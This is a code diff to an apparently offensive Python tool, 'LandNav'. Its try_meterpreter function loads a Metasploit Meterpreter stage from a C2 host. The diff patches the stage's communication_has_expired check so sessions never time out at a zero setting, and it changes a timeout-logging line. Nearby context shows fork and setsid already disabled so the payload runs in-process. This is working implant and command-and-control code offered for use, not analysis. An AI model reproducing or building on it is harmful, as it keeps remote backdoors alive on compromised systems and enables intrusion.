@@ -476,6 +476,27 @@ def try_meterpreter(c2_host, ports, connect_timeout=10, retry_delay=5,
             log.info("Meterpreter stage patched: fork disabled, "
                      "setsid disabled — dispatch runs in-process")
 
+            # ── Stage patch: fix communication_has_expired 0-timeout ─
+            # The stage's communication_has_expired property does:
+            #   return self.communication_last + self.communication_timeout < time.time()
+            # With communication_timeout=0, this is True immediately
+            # after any idle period.  session_has_expired handles 0
+            # correctly with an explicit guard, but communication_has_expired
+            # does NOT.  Patch the stage to add the same > 0 guard.
+            # This makes LandNav resilient regardless of handler config.
+            _comm_old = ('self.communication_last + '
+                         'self.communication_timeout < time.time()')
+            _comm_new = ('self.communication_timeout > 0 and '
+                         'self.communication_last + '
+                         'self.communication_timeout < time.time()')
+            if isinstance(prepared, bytes):
+                prepared = prepared.replace(
+                    _comm_old.encode(), _comm_new.encode())
+            else:
+                prepared = prepared.replace(_comm_old, _comm_new)
+            log.info("Meterpreter stage patched: communication_has_expired "
+                     "zero-timeout guard added")
+
             # ── Diagnostic: log the timeout values MSF sends ─────
             # The stage sets communication_timeout from the handler's
             # SessionCommunicationTimeout TLV.  0 means "never" to MSF
@@ -487,7 +508,8 @@ def try_meterpreter(c2_host, ports, connect_timeout=10, retry_delay=5,
                 '"[%s] INIT comm_timeout=%s sess_expiry=%s'
                 ' transport=%s\\n" % ('
                 '__import__("datetime").datetime.now(),'
-                'getattr(met,"communication_timeout","?"),'
+                'getattr(getattr(met,"transport",None),'
+                '"communication_timeout","?"),'
                 'getattr(met,"session_expiry_time",'
                 'getattr(met,"session_expiry_end","?")),'
                 'type(getattr(met,"transport",None)).__name__)); '
